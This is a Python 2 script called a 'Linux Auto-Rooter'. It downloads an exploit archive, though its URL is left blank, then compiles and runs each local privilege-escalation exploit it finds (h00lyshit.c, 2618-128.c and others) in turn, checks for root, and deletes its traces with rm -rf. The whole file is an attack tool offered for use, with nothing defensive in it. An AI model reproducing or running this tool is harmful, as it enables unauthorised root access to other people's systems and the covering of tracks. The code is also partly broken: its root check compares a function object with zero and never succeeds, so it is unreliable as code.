#!/usr/bin/python
# Linux Auto-Rooter
# By H.R. & Techie
# www.7echie.com/
#
# USAGE: ./ir00t.py <OPTION>
# EX: ./ir00t.py 1
# EX: ./ir00t.py d
#
# NOTE -K Options: 
#	1 => r00t"	
#	d => download all exploits for manual build & execution
#

import os, sys, urllib, shutil

pack = "" # current exploit archive

# Some checks to make sure the party goes on

if os.access(os.getcwd(), os.W_OK) == False: # checks if directory is writable
	print "Current directory is not writable dummy! Try running somewhere else like /tmp!"

uid = str(os.geteuid) # checks if already root
if uid == 0:
 	print "You are already root fool!"


def banner():
	print """
             _                    ___   ___  _            
            | |                  / _ \ / _ \| |           
  __ _ _   _| |_ ___ ______ _ __| | | | | | | |_ ___ _ __ 
 / _` | | | | __/ _ \______| '__| | | | | | | __/ _ \ '__|
| (_| | |_| | || (_) |     | |  | |_| | |_| | ||  __/ |   
 \__,_|\__,_|\__\___/      |_|   \___/ \___/ \__\___|_|   
                                                          
                                          by: Techie & HR

	"""

def help(): # help text
	print "USAGE: ./ir00t.py <OPTION>"
 	print "EX: ./ir00t.py 1"
 	print "EX: ./ir00t.py d"
 	print "Options:"
 	print "1 => r00t"
	print "d => download all exploits for manual build & execution"

def info(): # basic information on the target
	print 'Starting User ID: ' + str(os.geteuid()) + " , " + "Group ID: " + str(os.getgid()) # str(os.system('id'))
	print 'PWD: ' + str(os.getcwd())
	print 'Kernel: ' +' '.join(os.uname())

def sweeper(): # ninja
    print "Quick house cleaning to clean up your failures..."
    try:
    	os.system('rm -rf ir00t')
     	os.system('rm -rf ir00t.tar.gz')
    except:pass 
    # other options: 
	# shutil.rmtree('ir00t')
	# os.remove('ir00t.tar.gz')
	

def fetch(): # downloads the exploit archive and extracts it.
 	print "Grabbing the party supplies......."
 	fetched = urllib.urlretrieve(pack, "ir00t.tar.gz") # download request
 	print "Done"
 	print "OK, let's get the party started shall we.........knock, knock.." 
 	os.system('tar zxf ir00t.tar.gz')
 	print "Exploits extracted"

def privz(): # checks if root is obtained
 	uid = str(os.geteuid)
 	if uid == 0:
		print "User: " + str(os.getlogin())
       		print "New User ID: " + uid
        	print "w00t - we g0t m0th3r-fucking r00t!"
	else:
        	print "Still not r00t, going to keep pounding away!"

def ir00t():
	os.chdir('ir00t')
	find = os.listdir(os.getcwd())
	print "Exploits found on the current directory: " + str(find)
	FUN = find
	for JOY in FUN:
		print "Attempting to Configure and Run: " + JOY
		exp = str(JOY)
		print "Currently using the exploit: " + exp
		if exp == "h00lyshit.c":
			comph = "gcc " + "h00lyshit.c" + " -o" + "h00lyshit"
			os.system(comph)
			os.system("chmod +x h00lyshit")
			os.system("./h00lyshit")
		elif exp == "2618-128.c":
			comph = "gcc -Wall -o 2618-128 " + "2618-128.c"
			os.system(comph)
			os.system("chmod +x 2618-128")
			os.system("./2618-128")
		elif exp == "iroot.py":
			print 
		else:
			comph = "gcc " + str(exp) + " -o" + str(exp)
			os.system(comph)
			os.system("chmod +x " + exp)
			os.system("./"+exp)
		privz()

# PARTY TIME!

if(len(sys.argv) < 2):
    banner()
    help()
    print "\nProvide a parameter" 
elif sys.argv[1] == '-h':
	banner()
	help()
elif sys.argv[1] == '--help':
	banner()
	help()
elif sys.argv[1] == 'd':
	info()
	banner()
	fetch()
elif sys.argv[1] == '1':
	info()
	banner()
	fetch()
	ir00t()
	sweeper()
else:
	banner()
	print "Parameter not recognized" 

# Coded by Techie
# Concept by H.R.
# EOF
